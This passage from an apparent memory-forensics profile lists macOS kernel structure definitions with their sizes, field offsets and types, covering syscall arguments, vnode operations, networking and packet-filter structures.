    'flags_l_': [0x10, ['array', 0, ['char']]],
    'flags': [0x10, ['int']],
    'flags_r_': [0x14, ['array', 4, ['char']]],
}],
  'mk_timer_destroy_trap_args': [ 0x8, {
    'name_l_': [0x0, ['array', 0, ['char']]],
    'name': [0x0, ['unsigned int']],
    'name_r_': [0x4, ['array', 4, ['char']]],
}],
  'vnop_select_args': [ 0x28, {
    'a_desc': [0x0, ['pointer', ['vnodeop_desc']]],
    'a_vp': [0x8, ['pointer', ['vnode']]],
    'a_which': [0x10, ['int']],
    'a_fflags': [0x14, ['int']],
    'a_wql': [0x18, ['pointer', ['void']]],
    'a_context': [0x20, ['pointer', ['vfs_context']]],
}],
  'thread_time_constraint_policy': [ 0x10, {
    'period': [0x0, ['unsigned int']],
    'computation': [0x4, ['unsigned int']],
    'constraint': [0x8, ['unsigned int']],
    'preemptible': [0xc, ['int']],
}],
  'kas_info_args': [ 0x18, {
    'selector_l_': [0x0, ['array', 0, ['char']]],
    'selector': [0x0, ['int']],
    'selector_r_': [0x4, ['array', 4, ['char']]],
    'value': [0x8, ['unsigned long long']],
    'value_l_': [0x8, ['array', 0, ['char']]],
    'size_l_': [0x10, ['array', 0, ['char']]],
    'value_r_': [0x10, ['array', 0, ['char']]],
    'size': [0x10, ['unsigned long long']],
    'size_r_': [0x18, ['array', 0, ['char']]],
}],
  '__unnamed_17152514': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['uthread']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['uthread']]]],
}],
  'pktap_header': [ 0x6c, {
    'pth_length': [0x0, ['unsigned int']],
    'pth_type_next': [0x4, ['unsigned int']],
    'pth_dlt': [0x8, ['unsigned int']],
    'pth_ifname': [0xc, ['array', 24, ['char']]],
    'pth_flags': [0x24, ['unsigned int']],
    'pth_protocol_family': [0x28, ['unsigned int']],
    'pth_frame_pre_length': [0x2c, ['unsigned int']],
    'pth_frame_post_length': [0x30, ['unsigned int']],
    'pth_pid': [0x34, ['int']],
    'pth_comm': [0x38, ['array', 17, ['char']]],
    'pth_svc': [0x4c, ['unsigned int']],
    'pth_iftype': [0x50, ['unsigned short']],
    'pth_ifunit': [0x52, ['unsigned short']],
    'pth_epid': [0x54, ['int']],
    'pth_ecomm': [0x58, ['array', 17, ['char']]],
}],
  '__unnamed_7773592': [ 0x8, {
    'blue': [0x0, ['pointer', ['blue']]],
    'rio': [0x0, ['pointer', ['rio']]],
    'sfb': [0x0, ['pointer', ['sfb']]],
    'ptr': [0x0, ['pointer', ['void']]],
    'red': [0x0, ['pointer', ['red']]],
}],
  'ifa_msghdr': [ 0x14, {
    'ifam_msglen': [0x0, ['unsigned short']],
    'ifam_version': [0x2, ['unsigned char']],
    'ifam_type': [0x3, ['unsigned char']],
    'ifam_addrs': [0x4, ['int']],
    'ifam_flags': [0x8, ['int']],
    'ifam_index': [0xc, ['unsigned short']],
    'ifam_metric': [0x10, ['int']],
}],
  '__unnamed_8278659': [ 0x4, {
    'ip': [0x0, ['in_addr']],
    'unit': [0x0, ['int']],
}],
  'vnop_remove_args': [ 0x30, {
    'a_desc': [0x0, ['pointer', ['vnodeop_desc']]],
    'a_dvp': [0x8, ['pointer', ['vnode']]],
    'a_vp': [0x10, ['pointer', ['vnode']]],
    'a_cnp': [0x18, ['pointer', ['componentname']]],
    'a_flags': [0x20, ['int']],
    'a_context': [0x28, ['pointer', ['vfs_context']]],
}],
  'nfs_dulookup': [ 0x1c8, {
    'du_flags': [0x0, ['int']],
    'du_cn': [0x8, ['componentname']],
    'du_req': [0x48, ['nfsreq']],
    'du_smallname': [0x198, ['array', 48, ['char']]],
}],
  '__unnamed_16348355': [ 0x10, {
    'address': [0x0, ['unsigned long long']],
    'length': [0x8, ['unsigned long long']],
}],
  'nfsrv_uc_queue': [ 0x28, {
    'ucq_lock': [0x0, ['pointer', ['__unnamed_5432436']]],
    'ucq_queue': [0x8, ['array', 1, ['nfsrv_uc_q']]],
    'ucq_thd': [0x18, ['pointer', ['thread']]],
    'ucq_flags': [0x20, ['unsigned int']],
}],
  'IORangeAllocatorElement': [ 0x10, {
    'start': [0x0, ['unsigned long long']],
    'end': [0x8, ['unsigned long long']],
}],
  'mincore_args': [ 0x18, {
    'addr': [0x0, ['unsigned long long']],
    'addr_l_': [0x0, ['array', 0, ['char']]],
    'addr_r_': [0x8, ['array', 0, ['char']]],
    'len': [0x8, ['unsigned long long']],
    'len_l_': [0x8, ['array', 0, ['char']]],
    'vec_l_': [0x10, ['array', 0, ['char']]],
    'len_r_': [0x10, ['array', 0, ['char']]],
    'vec': [0x10, ['unsigned long long']],
    'vec_r_': [0x18, ['array', 0, ['char']]],
}],
  '_kernelrpc_mach_port_allocate_args': [ 0x18, {
    'target': [0x0, ['unsigned int']],
    'target_l_': [0x0, ['array', 0, ['char']]],
    'target_r_': [0x4, ['array', 4, ['char']]],
    'right': [0x8, ['unsigned int']],
    'right_l_': [0x8, ['array', 0, ['char']]],
    'right_r_': [0xc, ['array', 4, ['char']]],
    'name_l_': [0x10, ['array', 0, ['char']]],
    'name': [0x10, ['unsigned long long']],
    'name_r_': [0x18, ['array', 0, ['char']]],
}],
  'kmod_reference': [ 0x10, {
    'next': [0x0, ['pointer', ['kmod_reference']]],
    'info': [0x8, ['pointer', ['kmod_info']]],
}],
  'nstat_counts': [ 0x60, {
    'nstat_rxpackets': [0x0, ['unsigned long long']],
    'nstat_rxbytes': [0x8, ['unsigned long long']],
    'nstat_txpackets': [0x10, ['unsigned long long']],
    'nstat_txbytes': [0x18, ['unsigned long long']],
    'nstat_rxduplicatebytes': [0x20, ['unsigned int']],
    'nstat_rxoutoforderbytes': [0x24, ['unsigned int']],
    'nstat_txretransmit': [0x28, ['unsigned int']],
    'nstat_connectattempts': [0x2c, ['unsigned int']],
    'nstat_connectsuccesses': [0x30, ['unsigned int']],
    'nstat_min_rtt': [0x34, ['unsigned int']],
    'nstat_avg_rtt': [0x38, ['unsigned int']],
    'nstat_var_rtt': [0x3c, ['unsigned int']],
    'nstat_cell_rxbytes': [0x40, ['unsigned long long']],
    'nstat_cell_txbytes': [0x48, ['unsigned long long']],
    'nstat_wifi_rxbytes': [0x50, ['unsigned long long']],
    'nstat_wifi_txbytes': [0x58, ['unsigned long long']],
}],
  'kev_dl_proto_data': [ 0x20, {
    'link_data': [0x0, ['net_event_data']],
    'proto_family': [0x18, ['unsigned int']],
    'proto_remaining_count': [0x1c, ['unsigned int']],
}],
  'IOMapperLock_class': [ 0x8, {
    'fWaitLock': [0x0, ['pointer', ['__unnamed_15102313']]],
}],
  '__unnamed_4599827': [ 0x18, {
    'type': [0x0, ['unsigned int']],
    'pad4': [0x4, ['unsigned int']],
    'pc': [0x8, ['unsigned long']],
    'thread': [0x10, ['unsigned long']],
}],
  'vpl': [ 0x28, {
    'vpl_count': [0x0, ['unsigned int']],
    'vpl_internal_count': [0x4, ['unsigned int']],
    'vpl_external_count': [0x8, ['unsigned int']],
    'vpl_queue': [0x10, ['queue_entry']],
    'vpl_lock': [0x20, ['__unnamed_2868999']],
}],
  'nfsrv_fmod': [ 0x30, {
    'fm_link': [0x0, ['__unnamed_5252735']],
    'fm_vp': [0x10, ['pointer', ['vnode']]],
    'fm_context': [0x18, ['vfs_context']],
    'fm_deadline': [0x28, ['unsigned long long']],
}],
  'nlist_64': [ 0x10, {
    'n_un': [0x0, ['__unnamed_13427720']],
    'n_type': [0x4, ['unsigned char']],
    'n_sect': [0x5, ['unsigned char']],
    'n_desc': [0x6, ['unsigned short']],
    'n_value': [0x8, ['unsigned long long']],
}],
  'nd_ifinfo_compat': [ 0x38, {
    'linkmtu': [0x0, ['unsigned int']],
    'maxmtu': [0x4, ['unsigned int']],
    'basereachable': [0x8, ['unsigned int']],
    'reachable': [0xc, ['unsigned int']],
    'retrans': [0x10, ['unsigned int']],
    'flags': [0x14, ['unsigned int']],
    'recalctm': [0x18, ['int']],
    'chlim': [0x1c, ['unsigned char']],
    'receivedra': [0x1d, ['unsigned char']],
    'randomseed0': [0x1e, ['array', 8, ['unsigned char']]],
    'randomseed1': [0x26, ['array', 8, ['unsigned char']]],
    'randomid': [0x2e, ['array', 8, ['unsigned char']]],
}],
  'vlanreq': [ 0x12, {
    'vlr_parent': [0x0, ['array', 16, ['char']]],
    'vlr_tag': [0x10, ['unsigned short']],
}],
  'IORegCursor': [ 0x18, {
    'next': [0x0, ['pointer', ['IORegCursor']]],
    'current': [0x8, ['pointer', ['IORegistryEntry_class']]],
    'iter': [0x10, ['pointer', ['OSIterator_class']]],
}],
  'vnodeopv_desc': [ 0x10, {
    'opv_desc_vector_p': [0x0, ['pointer', ['pointer', ['pointer', ['void']]]]],
    'opv_desc_ops': [0x8, ['pointer', ['vnodeopv_entry_desc']]],
}],
  'xcpm_qos_name': [ 0x14, {
    'id': [0x0, ['Enumeration', {'target': 'int', 'choices': {0: 'XCPM_QOS_NORMAL', 1: 'XCPM_QOS_BACKGROUND', 2: 'XCPM_QOS_RT', 3: 'XCPM_QOS_RT_LONG', 4: 'XCPM_QOS_KERNEL', 5: 'XCPM_QOS_TTIER1', 6: 'XCPM_QOS_TTIER2', 7: 'XCPM_QOS_TTIER3', 8: 'XCPM_QOS_TTIER4', 9: 'XCPM_QOS_TTIER5', 10: 'XCPM_QOS_GRAPHICS_SERVER', 11: 'XCPM_QOS_IDLE', 12: 'XCPM_QOS_MAX'}}]],
    'name': [0x4, ['array', 16, ['char']]],
}],
  '__unnamed_9950789': [ 0x1, {
    'sadb_x_sa2_reserved1': [0x0, ['unsigned char']],
    'sadb_x_sa2_alwaysexpire': [0x0, ['unsigned char']],
}],
  'IOStatisticsMemory': [ 0x20, {
    'allocatedSize': [0x0, ['unsigned int']],
    'freedSize': [0x4, ['unsigned int']],
    'allocatedAlignedSize': [0x8, ['unsigned int']],
    'freedAlignedSize': [0xc, ['unsigned int']],
    'allocatedContiguousSize': [0x10, ['unsigned int']],
    'freedContiguousSize': [0x14, ['unsigned int']],
    'allocatedPageableSize': [0x18, ['unsigned int']],
    'freedPageableSize': [0x1c, ['unsigned int']],
}],
  'utun_crypto_framer_dtls_in_args_v1': [ 0xc, {
    'in_pattern_len': [0x0, ['int']],
    'in_pattern_mask_len': [0x4, ['int']],
    'in_data_offset': [0x8, ['int']],
}],
  'encodinglst': [ 0x8, {
    'slh_first': [0x0, ['pointer', ['hfs_encoding']]],
}],
  '__unnamed_9756871': [ 0x10, {
    'le_next': [0x0, ['pointer', ['nd_prefix']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['nd_prefix']]]],
}],
  '__unnamed_12597818': [ 0x10, {
    'le_next': [0x0, ['pointer', ['buf']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['buf']]]],
}],
  'sflt_filter_ext': [ 0x38, {
    'sf_ext_len': [0x0, ['unsigned int']],
    'sf_ext_accept': [0x8, ['pointer', ['void']]],
    'sf_ext_rsvd': [0x10, ['array', 5, ['pointer', ['void']]]],
}],
  '__unnamed_12602828': [ 0x4, {
    'msgh_descriptor_count': [0x0, ['unsigned int']],
}],
  'acct_args': [ 0x8, {
    'path': [0x0, ['unsigned long long']],
    'path_l_': [0x0, ['array', 0, ['char']]],
    'path_r_': [0x8, ['array', 0, ['char']]],
}],
  'pf_addr': [ 0x10, {
    'pfa': [0x0, ['__unnamed_9376912']],
}],
  'cl_wextent': [ 0x18, {
    'b_addr': [0x0, ['long long']],
    'e_addr': [0x8, ['long long']],
    'io_flags': [0x10, ['int']],
}],
  'pf_fragq': [ 0x8, {
    'lh_first': [0x0, ['pointer', ['pf_frent']]],
}],
  'mac_module_data': [ 0x30, {
    'base_addr': [0x0, ['pointer', ['void']]],
    'size': [0x8, ['unsigned int']],
    'count': [0xc, ['unsigned int']],
    'data': [0x10, ['array', 1, ['mac_module_data_element']]],
}],
  'psynch_cvbroad_args': [ 0x38, {
    'cv_l_': [0x0, ['array', 0, ['char']]],
    'cv': [0x0, ['unsigned long long']],
    'cv_r_': [0x8, ['array', 0, ['char']]],
    'cvlsgen': [0x8, ['unsigned long long']],
    'cvlsgen_l_': [0x8, ['array', 0, ['char']]],
    'cvlsgen_r_': [0x10, ['array', 0, ['char']]],
    'cvudgen_l_': [0x10, ['array', 0, ['char']]],
    'cvudgen': [0x10, ['unsigned long long']],
    'flags': [0x18, ['unsigned int']],
    'cvudgen_r_': [0x18, ['array', 0, ['char']]],
    'flags_l_': [0x18, ['array', 0, ['char']]],
    'flags_r_': [0x1c, ['array', 4, ['char']]],
    'mutex': [0x20, ['unsigned long long']],
    'mutex_l_': [0x20, ['array', 0, ['char']]],
    'mugen_l_': [0x28, ['array', 0, ['char']]],
    'mugen': [0x28, ['unsigned long long']],
    'mutex_r_': [0x28, ['array', 0, ['char']]],
    'tid_l_': [0x30, ['array', 0, ['char']]],
    'tid': [0x30, ['unsigned long long']],
    'mugen_r_': [0x30, ['array', 0, ['char']]],
    'tid_r_': [0x38, ['array', 0, ['char']]],
}],
  'supgroups': [ 0x10, {
    'count': [0x0, ['pointer', ['int']]],
    'groups': [0x8, ['pointer', ['unsigned int']]],
}],
  'searchstate': [ 0x22c, {
    'ss_union_flags': [0x0, ['unsigned int']],
    'ss_union_layer': [0x4, ['unsigned int']],
    'ss_fsstate': [0x8, ['array', 548, ['unsigned char']]],
}],
  'vstruct_alias': [ 0x10, {
    'name': [0x0, ['pointer', ['memory_object_pager_ops']]],
    'vs': [0x8, ['pointer', ['vstruct']]],
}],
  'LAG_s': [ 0x38, {
    'lag_list': [0x0, ['__unnamed_6809248']],
    'lag_port_list': [0x10, ['port_list']],
    'lag_port_count': [0x20, ['short']],
    'lag_selected_port_count': [0x22, ['short']],
    'lag_active_media': [0x24, ['int']],
    'lag_info': [0x28, ['LAG_info_s']],
}],
  'gzalloc_data': [ 0x10, {
    'gzfc_index': [0x0, ['unsigned int']],
    'gzfc': [0x8, ['pointer', ['unsigned long']]],
}],
  'pf_rule_ptr': [ 0x8, {
    'nr': [0x0, ['unsigned int']],
    'ptr': [0x0, ['pointer', ['pf_rule']]],
}],
  'nfsrv_uc_q': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['nfsrv_uc_arg']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['nfsrv_uc_arg']]]],
}],
  'clock_ops': [ 0x20, {
    'c_config': [0x0, ['pointer', ['void']]],
    'c_init': [0x8, ['pointer', ['void']]],
    'c_gettime': [0x10, ['pointer', ['void']]],
    'c_getattr': [0x18, ['pointer', ['void']]],
}],
  '__unnamed_9949890': [ 0x8, {
    'sle_next': [0x0, ['pointer', ['in6_multi']]],
}],
  'pfioc_iface_32': [ 0x28, {
    'pfiio_name': [0x0, ['array', 16, ['char']]],
    'pfiio_buffer': [0x10, ['unsigned int']],
    'pfiio_esize': [0x18, ['int']],
    'pfiio_size': [0x1c, ['int']],
    'pfiio_nzero': [0x20, ['int']],
    'pfiio_flags': [0x24, ['int']],
}],
  'devfsmount': [ 0x10, {
    'mount': [0x0, ['pointer', ['mount']]],
    'plane_root': [0x8, ['pointer', ['devdirent']]],
}],
  'copyfile_args': [ 0x20, {
    'from': [0x0, ['unsigned long long']],
    'from_l_': [0x0, ['array', 0, ['char']]],
    'to_l_': [0x8, ['array', 0, ['char']]],
    'to': [0x8, ['unsigned long long']],
    'from_r_': [0x8, ['array', 0, ['char']]],
    'mode_l_': [0x10, ['array', 0, ['char']]],
    'to_r_': [0x10, ['array', 0, ['char']]],
    'mode': [0x10, ['int']],
    'mode_r_': [0x14, ['array', 4, ['char']]],
    'flags_l_': [0x18, ['array', 0, ['char']]],
    'flags': [0x18, ['int']],
    'flags_r_': [0x1c, ['array', 4, ['char']]],
}],
  'inpcbhead': [ 0x8, {
    'lh_first': [0x0, ['pointer', ['inpcb']]],
}],
  'vnop_inactive_args': [ 0x18, {
    'a_desc': [0x0, ['pointer', ['vnodeop_desc']]],
    'a_vp': [0x8, ['pointer', ['vnode']]],
    'a_context': [0x10, ['pointer', ['vfs_context']]],
}],
  'ether_header': [ 0xe, {
    'ether_dhost': [0x0, ['array', 6, ['unsigned char']]],
    'ether_shost': [0x6, ['array', 6, ['unsigned char']]],
    'ether_type': [0xc, ['unsigned short']],
}],
  '__unnamed_8277425': [ 0x10, {
    'fu_reject_code': [0x0, ['unsigned short']],
    'fu_pipe_nr': [0x0, ['unsigned short']],
    'fu_fwd_ip': [0x0, ['sockaddr_in']],
    'fu_divert_port': [0x0, ['unsigned short']],
    'fu_skipto_rule': [0x0, ['unsigned short']],
}],
  'task_category_policy': [ 0x4, {
    'role': [0x0, ['int']],
}],
  'sackblk': [ 0x8, {
    'start': [0x0, ['unsigned int']],
    'end': [0x4, ['unsigned int']],
}],
  'recovery': [ 0x10, {
    'fault_addr': [0x0, ['unsigned long']],
    'recover_addr': [0x8, ['unsigned long']],
}],
  '__unnamed_8818841': [ 0xc, {
    'inp6_hlim': [0x0, ['unsigned char']],
    'inp6_cksum': [0x4, ['int']],
    'inp6_ifindex': [0x8, ['unsigned short']],
    'inp6_hops': [0xa, ['short']],
}],
  '__unnamed_8073615': [ 0x10, {
    'inp6_local': [0x0, ['in6_addr']],
    'inp46_local': [0x0, ['in_addr_4in6']],
}],
  '__unnamed_7640273': [ 0x10, {
    'le_next': [0x0, ['pointer', ['pktap_softc']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['pktap_softc']]]],
}],
  'xunpcb': [ 0x2ac, {
    'xu_len': [0x0, ['unsigned int']],
    'xu_unpp': [0x4, ['unsigned int']],
    'xu_unp': [0x8, ['unpcb_compat']],
    'xu_au': [0x40, ['__unnamed_12211222']],
    'xu_cau': [0x140, ['__unnamed_12211273']],
    'xu_socket': [0x240, ['xsocket']],
    'xu_alignment_hack': [0x2a4, ['unsigned long long']],
}],
  '__unnamed_16392238': [ 0x18, {
    'rbe_parent': [0x0, ['pointer', ['KextNode']]],
    'rbe_left': [0x8, ['pointer', ['KextNode']]],
    'rbe_right': [0x10, ['pointer', ['KextNode']]],
}],
  'utun_crypto_framer': [ 0x54, {
    'valid': [0x0, ['int']],
    'type': [0x4, ['Enumeration', {'target': 'int', 'choices': {1: 'UTUN_CRYPTO_TYPE_IPSEC', 2: 'UTUN_CRYPTO_TYPE_DTLS', 3: 'UTUN_CRYPTO_TYPE_MAX'}}]],
    'dir': [0x8, ['Enumeration', {'target': 'int', 'choices': {1: 'UTUN_CRYPTO_DIR_IN', 2: 'UTUN_CRYPTO_DIR_OUT', 3: 'UTUN_CRYPTO_DIR_MAX'}}]],
    'inner_type': [0xc, ['Enumeration', {'target': 'int', 'choices': {1: 'UTUN_CRYPTO_INNER_TYPE_IPv4', 2: 'UTUN_CRYPTO_INNER_TYPE_IPv6', 3: 'UTUN_CRYPTO_INNER_TYPE_MAX'}}]],
    'inner_protocol_family': [0x10, ['unsigned int']],
    'state': [0x14, ['utun_crypto_framer_state']],
    'framer_chain': [0x44, ['__unnamed_7226446']],
}],
  '__semwait_signal_nocancel_args': [ 0x30, {
    'cond_sem_l_': [0x0, ['array', 0, ['char']]],
    'cond_sem': [0x0, ['int']],
    'cond_sem_r_': [0x4, ['array', 4, ['char']]],
    'mutex_sem': [0x8, ['int']],
    'mutex_sem_l_': [0x8, ['array', 0, ['char']]],
    'mutex_sem_r_': [0xc, ['array', 4, ['char']]],
    'timeout_l_': [0x10, ['array', 0, ['char']]],
    'timeout': [0x10, ['int']],
    'timeout_r_': [0x14, ['array', 4, ['char']]],
    'relative_l_': [0x18, ['array', 0, ['char']]],
    'relative': [0x18, ['int']],
    'relative_r_': [0x1c, ['array', 4, ['char']]],
    'tv_sec_l_': [0x20, ['array', 0, ['char']]],
    'tv_sec': [0x20, ['long long']],
    'tv_nsec': [0x28, ['int']],
    'tv_sec_r_': [0x28, ['array', 0, ['char']]],
    'tv_nsec_l_': [0x28, ['array', 0, ['char']]],
    'tv_nsec_r_': [0x2c, ['array', 4, ['char']]],
}],
  'pfioc_token': [ 0x54, {
    'token_value': [0x0, ['unsigned long long']],
    'timestamp': [0x8, ['unsigned long long']],
    'pid': [0x10, ['int']],
    'proc_name': [0x14, ['array', 64, ['char']]],
}],
  'user64_sf_hdtr': [ 0x20, {
    'headers': [0x0, ['unsigned long long']],
    'hdr_cnt': [0x8, ['int']],
    'trailers': [0x10, ['unsigned long long']],
    'trl_cnt': [0x18, ['int']],
}],
  '__unnamed_5591064': [ 0x4, {
    'bmu_bitmap': [0x0, ['unsigned int']],
    'bmu_avail': [0x0, ['int']],
}],
  'i386_interrupt_handler': [ 0x20, {
    'handler': [0x0, ['pointer', ['void']]],
    'nub': [0x8, ['pointer', ['void']]],
    'target': [0x10, ['pointer', ['void']]],
    'refCon': [0x18, ['pointer', ['void']]],
}],
  'default_pager_object': [ 0x10, {
    'dpo_object': [0x0, ['unsigned long']],
    'dpo_size': [0x8, ['unsigned long']],
}],
  '_satree': [ 0x8, {
    'lh_first': [0x0, ['pointer', ['secasvar']]],
}],
  'csops_audittoken_args': [ 0x28, {
    'pid': [0x0, ['int']],
    'pid_l_': [0x0, ['array', 0, ['char']]],
    'pid_r_': [0x4, ['array', 4, ['char']]],
    'ops_l_': [0x8, ['array', 0, ['char']]],
    'ops': [0x8, ['unsigned int']],
    'ops_r_': [0xc, ['array', 4, ['char']]],
    'useraddr': [0x10, ['unsigned long long']],
    'useraddr_l_': [0x10, ['array', 0, ['char']]],
    'usersize': [0x18, ['unsigned long long']],
    'usersize_l_': [0x18, ['array', 0, ['char']]],
    'useraddr_r_': [0x18, ['array', 0, ['char']]],
    'usersize_r_': [0x20, ['array', 0, ['char']]],
    'uaudittoken': [0x20, ['unsigned long long']],
    'uaudittoken_l_': [0x20, ['array', 0, ['char']]],
    'uaudittoken_r_': [0x28, ['array', 0, ['char']]],
}],
  '_kdp_xcpu_call_func': [ 0x28, {
    'func': [0x0, ['pointer', ['void']]],
    'arg0': [0x8, ['pointer', ['void']]],
    'arg1': [0x10, ['pointer', ['void']]],
    'ret': [0x18, ['long']],
    'cpu': [0x20, ['unsigned short']],
}],
  '__unnamed_6250697': [ 0x10, {
    'le_next': [0x0, ['pointer', ['kfs_event']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['kfs_event']]]],
}],
  'nstat_provider': [ 0x50, {
    'next': [0x0, ['pointer', ['nstat_provider']]],
    'nstat_provider_id': [0x8, ['unsigned int']],
    'nstat_descriptor_length': [0x10, ['unsigned long']],
    'nstat_lookup': [0x18, ['pointer', ['void']]],
    'nstat_gone': [0x20, ['pointer', ['void']]],
    'nstat_counts': [0x28, ['pointer', ['void']]],
    'nstat_watcher_add': [0x30, ['pointer', ['void']]],
    'nstat_watcher_remove': [0x38, ['pointer', ['void']]],
    'nstat_copy_descriptor': [0x40, ['pointer', ['void']]],
    'nstat_release': [0x48, ['pointer', ['void']]],
}],
  'pktap_list': [ 0x8, {
    'lh_first': [0x0, ['pointer', ['pktap_softc']]],
}],
  '__kern_sigaction_u': [ 0x8, {
    '__sa_sigaction': [0x0, ['unsigned long long']],
    '__sa_handler': [0x0, ['unsigned long long']],
}],
  'ipsec_pcb': [ 0x20, {
    'ipsec_ctlref': [0x0, ['pointer', ['void']]],
    'ipsec_ifp': [0x8, ['pointer', ['ifnet']]],
    'ipsec_unit': [0x10, ['unsigned int']],
    'ipsec_flags': [0x14, ['unsigned int']],
    'ipsec_ext_ifdata_stats': [0x18, ['int']],
}],
  'ifbareq32': [ 0x20, {
    'ifba_ifsname': [0x0, ['array', 16, ['char']]],
    'ifba_expire': [0x10, ['unsigned int']],
    'ifba_flags': [0x14, ['unsigned char']],
    'ifba_dst': [0x15, ['array', 6, ['unsigned char']]],
    'ifba_vlan': [0x1c, ['unsigned short']],
}],
  '__unnamed_7030576': [ 0x1c, {
    'v4': [0x0, ['sockaddr_in']],
    'v6': [0x0, ['sockaddr_in6']],
}],
  'vstruct': [ 0x70, {
    'vs_pager_header': [0x0, ['ipc_object_header']],
    'vs_pager_ops': [0x8, ['pointer', ['memory_object_pager_ops']]],
    'vs_control': [0x10, ['pointer', ['memory_object_control']]],
    'vs_lock': [0x18, ['hslock']],
    'vs_next_seqno': [0x20, ['unsigned int']],
    'vs_seqno': [0x24, ['unsigned int']],
    'vs_readers': [0x28, ['unsigned int']],
    'vs_writers': [0x2c, ['unsigned int']],
    'vs_waiting_write': [0x30, ['BitField', {'end_bit': 3, 'start_bit': 2}]],
    'vs_waiting_async': [0x30, ['BitField', {'end_bit': 4, 'start_bit': 3}]],
    'vs_indirect': [0x30, ['BitField', {'end_bit': 5, 'start_bit': 4}]],
    'vs_waiting_seqno': [0x30, ['BitField', {'end_bit': 1, 'start_bit': 0}]],
    'vs_xfer_pending': [0x30, ['BitField', {'end_bit': 6, 'start_bit': 5}]],
    'vs_waiting_read': [0x30, ['BitField', {'end_bit': 2, 'start_bit': 1}]],
    'vs_async_pending': [0x34, ['unsigned int']],
    'vs_errors': [0x38, ['unsigned int']],
    'vs_references': [0x3c, ['unsigned int']],
    'vs_links': [0x40, ['queue_entry']],
    'vs_clshift': [0x50, ['unsigned int']],
    'vs_size': [0x54, ['unsigned int']],
    'vs_map_lock': [0x58, ['_lck_mtx_']],
    'vs_un': [0x68, ['__unnamed_100176']],
}],
  '__unnamed_10824508': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['kaudit_record']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['kaudit_record']]]],
}],
  'udpiphdr': [ 0x1c, {
    'ui_i': [0x0, ['ipovly']],
    'ui_u': [0x14, ['udphdr']],
}],
  'ctl_cb': [ 0x38, {
    'next': [0x0, ['__unnamed_12508638']],
    'mtx': [0x10, ['pointer', ['__unnamed_12483677']]],
    'so': [0x18, ['pointer', ['socket']]],
    'kctl': [0x20, ['pointer', ['kctl']]],
    'userdata': [0x28, ['pointer', ['void']]],
    'unit': [0x30, ['unsigned int']],
    'usecount': [0x34, ['unsigned int']],
}],
  'ifvlan_list': [ 0x8, {
    'lh_first': [0x0, ['pointer', ['ifvlan']]],
}],
  'x86_debug_state64': [ 0x40, {
    'dr0': [0x0, ['unsigned long long']],
    'dr1': [0x8, ['unsigned long long']],
    'dr2': [0x10, ['unsigned long long']],
    'dr3': [0x18, ['unsigned long long']],
    'dr4': [0x20, ['unsigned long long']],
    'dr5': [0x28, ['unsigned long long']],
    'dr6': [0x30, ['unsigned long long']],
    'dr7': [0x38, ['unsigned long long']],
}],
  'dn_pipe_64': [ 0x160, {
    'next': [0x0, ['unsigned long long']],
    'pipe_nr': [0x8, ['int']],
    'bandwidth': [0xc, ['int']],
    'delay': [0x10, ['int']],
    'head': [0x18, ['unsigned long long']],
    'tail': [0x20, ['unsigned long long']],
    'scheduler_heap': [0x28, ['dn_heap_64']],
    'not_eligible_heap': [0x40, ['dn_heap_64']],
    'idle_heap': [0x58, ['dn_heap_64']],
    'V': [0x70, ['unsigned long long']],
    'sum': [0x78, ['int']],
    'numbytes': [0x7c, ['int']],
    'sched_time': [0x80, ['unsigned long long']],
    'if_name': [0x88, ['array', 16, ['char']]],
    'ifp': [0x98, ['unsigned long long']],
    'ready': [0xa0, ['int']],
    'fs': [0xa8, ['dn_flow_set_64']],
}],
  'ndrv_multiaddr': [ 0x20, {
    'next': [0x0, ['pointer', ['ndrv_multiaddr']]],
    'ifma': [0x8, ['pointer', ['ifmultiaddr']]],
    'addr': [0x10, ['sockaddr']],
}],
  'FndrOpaqueInfo': [ 0x10, {
    'opaque': [0x0, ['array', 16, ['signed char']]],
}],
  'mtrace': [ 0xa0, {
    'collisions': [0x0, ['unsigned long long']],
    'hitcount': [0x8, ['unsigned long long']],
    'allocs': [0x10, ['unsigned long long']],
    'depth': [0x18, ['unsigned long long']],
    'addr': [0x20, ['array', 16, ['unsigned long']]],
}],
  'IOStatisticsClassName': [ 0x40, {
    'name': [0x0, ['array', 64, ['char']]],
}],
  'in6_multistep': [ 0x10, {
    'i_ia': [0x0, ['pointer', ['in6_ifaddr']]],
    'i_in6m': [0x8, ['pointer', ['in6_multi']]],
}],
  'nd_opt_hdr': [ 0x2, {
    'nd_opt_type': [0x0, ['unsigned char']],
    'nd_opt_len': [0x1, ['unsigned char']],
}],
  'vnop_setxattr_args': [ 0x30, {
    'a_desc': [0x0, ['pointer', ['vnodeop_desc']]],
    'a_vp': [0x8, ['pointer', ['vnode']]],
    'a_name': [0x10, ['pointer', ['char']]],
    'a_uio': [0x18, ['pointer', ['uio']]],
    'a_options': [0x20, ['int']],
    'a_context': [0x28, ['pointer', ['vfs_context']]],
}],
  'pf_pool': [ 0x48, {
    'list': [0x0, ['pf_palist']],
    'cur': [0x10, ['pointer', ['pf_pooladdr']]],
    'key': [0x18, ['pf_poolhashkey']],
    'counter': [0x28, ['pf_addr']],
    'tblidx': [0x38, ['int']],
    'proxy_port': [0x3c, ['array', 2, ['unsigned short']]],
    'port_op': [0x40, ['unsigned char']],
    'opts': [0x41, ['unsigned char']],
}],
  '_lck_rw_t_internal_': [ 0x10, {
    'lck_rw_shared_count': [0x0, ['unsigned short']],
    'lck_rw_interlock': [0x2, ['unsigned char']],
    'lck_w_waiting': [0x3, ['BitField', {'end_bit': 5, 'start_bit': 4}]],
    'lck_rw_can_sleep': [0x3, ['BitField', {'end_bit': 6, 'start_bit': 5}]],
    'lck_r_waiting': [0x3, ['BitField', {'end_bit': 4, 'start_bit': 3}]],
    'lck_rw_priv_excl': [0x3, ['BitField', {'end_bit': 1, 'start_bit': 0}]],
    'lck_rw_want_write': [0x3, ['BitField', {'end_bit': 3, 'start_bit': 2}]],
    'lck_rw_padb6': [0x3, ['BitField', {'end_bit': 8, 'start_bit': 6}]],
    'lck_rw_want_upgrade': [0x3, ['BitField', {'end_bit': 2, 'start_bit': 1}]],
